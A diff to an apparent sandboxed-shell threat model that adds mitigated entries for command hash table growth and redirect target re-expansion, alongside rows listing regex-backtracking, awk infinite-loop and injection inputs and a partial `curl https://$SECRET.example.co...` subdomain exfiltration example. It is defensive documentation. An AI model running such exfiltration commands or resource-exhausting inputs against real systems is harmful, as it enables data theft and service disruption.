@@ -77,6 +77,7 @@ through configurable limits.
 | Regex backtrack (TM-DOS-025) | `grep "a](*b)*c" file` | Regex crate limits | PARTIAL |
 | AWK unbounded loops (TM-DOS-033) | `BEGIN { while(1){} }`, nested loops, deep recursion | Per-loop and whole-program loop caps from `ExecutionLimits`, call-depth cap; all fatal (exit 2) | MITIGATED |
 | awk commands (TM-DOS-128) | `system()`, `print \| cmd` or `cmd \| getline` in a loop | Each command runs as `sh -c` in the sandbox shell under the session's command budget and timeout; awk's loop, output and getline caps still apply | MITIGATED |
+| Command hash table growth (TM-DOS-129) | `hash -p /x nameN` or many distinct PATH commands | The table holds at most 512 entries and drops the oldest; assigning `PATH` empties it | MITIGATED |
 
 **Stack Overflow / Recursion:**
 
@@ -500,6 +501,7 @@ exfiltration by encoding secrets in subdomains (`curl https://$SECRET.example.co
 | Template injection via `#each` data (TM-INJ-023) | Data values contain `{{`/`#each` markers | Template markers escaped in data before interpolation | MITIGATED |
 | Tool schema `$ref` bypass (TM-INJ-024) | Referenced constraints are skipped before host callback invocation | Resolve local JSON Pointer references; fail closed on invalid references | MITIGATED |
 | Host-bridge argument re-parsing (TM-INJ-025) | A reference bridge joins parsed arguments into a `sh -c` / `cmd /C` script | Launch a concrete executable and pass every caller argument as its own argv value | MITIGATED |
+| Redirect target re-expansion (TM-INJ-026) | `> $v` with a value holding `$(...)` text or a glob | A target is expanded once; zero or several words are `ambiguous redirect` and nothing is written; the result is used literally afterwards | MITIGATED |
 
 **Variable Expansion:**
 
